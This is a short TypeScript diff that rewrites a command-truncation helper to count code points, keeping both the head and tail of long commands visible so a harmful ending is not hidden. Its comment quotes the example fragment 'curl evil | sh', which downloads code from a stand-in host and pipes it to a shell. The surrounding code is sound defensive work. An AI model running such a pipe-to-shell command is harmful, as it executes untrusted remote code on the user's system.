@@ -90,13 +90,16 @@ function cut(text: string, max: number): string {
 }
 
 /**
- * A command on one line, at most 80 chars. A longer one keeps its first 40 and last 39 chars around "…", so a harmful
- * tail (`… ; curl evil | sh`) is never hidden behind a harmless head.
+ * A command on one line, at most 80 code points. A longer one keeps its first 40 and last 39 around "…", so a
+ * harmful tail (`… ; curl evil | sh`) is never hidden behind a harmless head.
  */
 function cutCommand(command: string): string {
-  const line = command.replace(/\s+/g, ' ').trim()
-  if (line.length <= COMMAND_MAX) return line
-  return `${line.slice(0, COMMAND_HEAD)}…${line.slice(line.length - (COMMAND_MAX - COMMAND_HEAD - 1))}`
+  // Count and cut code points, not UTF-16 units, so an emoji is never split into a lone surrogate.
+  const chars = Array.from(command.replace(/\s+/g, ' ').trim())
+  if (chars.length <= COMMAND_MAX) return chars.join('')
+  const head = chars.slice(0, COMMAND_HEAD).join('')
+  const tail = chars.slice(chars.length - (COMMAND_MAX - COMMAND_HEAD - 1)).join('')
+  return `${head}…${tail}`
 }
 
 function hostOf(url: unknown): string | undefined {
